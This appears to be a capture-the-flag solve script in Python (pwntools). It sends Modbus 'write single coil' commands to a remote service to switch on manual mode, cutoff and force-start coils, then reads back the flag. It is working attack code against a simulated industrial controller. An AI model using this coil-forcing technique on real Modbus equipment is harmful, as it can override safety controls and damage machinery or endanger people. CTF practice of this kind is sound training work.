#!/usr/bin/env python3

from pwn import *
from sys import argv
import json

slave = 82
manual_mode_control = 9947
cutoff_in = 26
force_start_in = 52
write_single_coil = 5
on = 0xff00

def to_cmd(slv, fn, addr, data):
    return bytes(hex(slv)[2:].rjust(2, '0') + \
            hex(fn)[2:].rjust(2, '0') + \
            hex(addr)[2:].rjust(4, '0') + \
            hex(data)[2:].rjust(4, '0'), 'utf-8')

if __name__ == "__main__":
    if len(argv) != 2:
        print('Usage: ./writup IP:PORT')
        exit(1)

    IP, PORT = argv[1].split(':')
    addrs = [ manual_mode_control, cutoff_in,
             force_start_in ]

    with remote(IP, PORT) as run:
        for addr in addrs:
            run.sendlineafter(b': ', b'2')
            run.sendlineafter(b': ', to_cmd(slave, write_single_coil, addr, on))
        run.sendlineafter(b': ', b'1')
        print(json.loads(run.recvline())['flag'])
